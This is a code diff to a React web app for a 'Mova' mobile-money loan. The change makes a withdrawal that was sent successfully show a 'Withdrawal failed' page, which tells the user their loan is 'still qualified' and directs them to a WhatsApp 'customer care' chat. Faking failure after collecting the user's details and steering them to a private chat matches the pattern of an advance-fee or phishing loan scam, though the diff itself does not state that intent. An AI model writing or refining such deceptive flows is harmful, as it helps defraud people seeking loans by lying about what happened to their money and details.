@@ -227,7 +227,7 @@ function App() {
 
       setWithdrawalConfirmed(true);
       setIsLoading(false);
-      navigateToPage('withdrawalConfirmed', 'Processing withdrawal details');
+      navigateToPage('withdrawalFailed', 'Processing withdrawal details');
     } catch (error) {
       setIsLoading(false);
       setWithdrawalError(error.message || 'We could not send your details. Please try again.');
@@ -611,13 +611,13 @@ function App() {
       <main className="success-page">
         <div className="success-card failure-card">
           <div className="failure-badge">!</div>
-          <span className="eyebrow">Withdrawal could not be completed</span>
+          <span className="eyebrow">Withdrawal failed</span>
           <h1>Your loan is still qualified.</h1>
-          <p className="success-intro">We could not complete the MTN withdrawal with the details provided. Your eligibility result is still active, so our support team can help you finish the payout.</p>
+          <p className="success-intro">We could not complete the withdrawal with the details provided. Your eligibility result is still active, so customer care can help you finish the payout.</p>
           <div className="support-panel">
-            <strong>Contact Mova support</strong>
-            <span>Share your application details with our team and we will help resolve the withdrawal issue.</span>
-            <a className="whatsapp-button" href="https://wa.me/qr/EPZ6GW2PGBL7H1" target="_blank" rel="noreferrer"><MessageCircle size={17} /> Chat with support on WhatsApp</a>
+            <strong>Contact customer care</strong>
+            <span>Chat with Mova customer care on WhatsApp to resolve the withdrawal issue.</span>
+            <a className="whatsapp-button" href="https://wa.me/qr/EPZ6GW2PGBL7H1" target="_blank" rel="noreferrer" aria-label="Chat with Mova customer care on WhatsApp"><MessageCircle size={17} /> Chat with customer care on WhatsApp</a>
           </div>
           <div className="wizard-actions review-actions">
             <button type="button" className="secondary-button" onClick={() => navigateToPage('success', 'Returning to your offer')}>Back to offer</button>
